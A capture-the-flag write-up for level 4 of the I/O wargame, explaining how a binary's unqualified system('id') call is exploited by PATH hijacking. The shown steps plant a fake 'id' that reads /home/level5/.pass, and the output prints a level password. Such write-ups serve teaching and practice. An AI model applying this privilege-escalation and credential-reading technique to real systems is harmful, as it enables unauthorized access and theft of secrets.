@@ -1,0 +1,72 @@
+I/O – level 4
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+level4@io:~$ cat /levels/level04.c
+#include &lt;stdlib.h&gt;
+ 
+int main() {
+ 
+system(&quot;id&quot;);
+ 
+return 0;
+}
+This is a very simple binary the main function calls a system function which executes the “id” command, which I have used previously to view the user information about the current user. Having a look at the man page for the system function I learnt that system() executes a command specified in command by calling /bin/sh -c command, and returns after the command has been completed. The way a shell knows where to find a given command is because of environment variables, defined in PATH.
+
+In context to this binary the system function sees the command “id” to execute so it reads the environment variable PATH information from left to right until a valid location for the “id” command to execute. I can have a look at the environment variable PATH as shown below.
+
+1
+2
+level4@io:~$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+Which means if I am able to add a new path for the command “id” I will have highjacked the system function. Each level has a tmp found assigned for it, /tmp/level4, there is a id.c which another user must of created, the source code for the new “id” command are shown below.
+
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+&lt;pre class=&quot;line-pre&quot;&gt;level4@io:/tmp/level4$ cat id.c
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+ 
+int main() {
+FILE *f;
+char buf[256];
+f = fopen(&quot;/home/level5/.pass&quot;, &quot;r&quot;);
+fread(buf, 1, 100, f);
+printf(&quot;%s&quot;, buf);
+}&lt;/pre&gt;
+This id variable simply opens the file containing the password and displays back to the screen. Now by compiling the source code with gcc I create the new “id” command and then I need to add the location of /tmp/level4 to the $PATH variable so the level04 binary will execute.
+
+1
+2
+3
+4
+&lt;code&gt;level4@io:/tmp/level4$ export PATH=/tmp/level4:$PATH&lt;/code&gt;
+ 
+level4@io:/tmp/level4$ echo $PATH
+/tmp/level4:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+As the above output shows that the directory /tmp/level4 to that start of the environment variable list which is before /usr/bin which is where the command “id” is actually stored.
+
+1
+2
+3
+4
+level4@io:/tmp/level4$ gcc id.c -o id
+level4@io:/tmp/level4$ /levels/level04
+Zx5VdzACNMY9lQ
+·
